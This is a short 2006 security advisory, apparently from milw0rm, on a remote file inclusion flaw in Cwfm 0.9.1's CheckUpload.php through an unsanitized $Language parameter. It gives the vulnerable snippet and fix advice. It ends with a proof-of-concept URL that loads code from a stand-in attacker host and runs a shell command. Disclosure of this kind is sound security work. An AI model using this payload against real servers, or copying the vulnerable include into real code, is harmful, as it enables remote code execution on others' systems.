@@ -1,0 +1,53 @@
++--------------------------------------------------------------------
++
++ Cwfm-0.9.1 (Language) Remote File Inclusion
++
++ Original advisory:
++
++ http://www.bb-pcsecurity.de/Websecurity/301/org/Cwfm-0.9.1_(Language)_Remote_File_Inclusion.htm
++
++--------------------------------------------------------------------
++
++ Affected Software .: Cwfm 0.9.1
++ Venedor ...........: http://cwfm.sourceforge.net/
++ Class .............: Remote File Inclusion in /CheckUpload.php
++ Risk ..............: high (Remote File Execution)
++ Found by ..........: Philipp Niedziela
++ Contact ...........: webmaster[at]bb-pcsecurity[.]de
++                      http://www.bb-pcsecurity.de
++
++--------------------------------------------------------------------
++
++ Code /CheckUpload.php
++
++ .....
++ session_start();
++ include_once("Global.php");
++ //include_once("lang/$Language.php");
++ include_once("$Language.php");
++ .....
++
++--------------------------------------------------------------------
++
++ $Language is not properly sanitized before being used.
++
++--------------------------------------------------------------------
++
++ Solution:
++ Declare $Language before using, include config-file or
++ denie direct access to the vuln file.
++
++--------------------------------------------------------------------
++
++ PoC:
++
++ http://[target]/CheckUpload.php?Language=http://evilsite.com/dblib.php/&cmd=ls
++
++--------------------------------------------------------------------
++
++ Note:
++ Venedor contacted, but no response. So do a dirty patch.
++
++-------------------------[ E O F ]----------------------------------
+
+# milw0rm.com [2006-08-08]
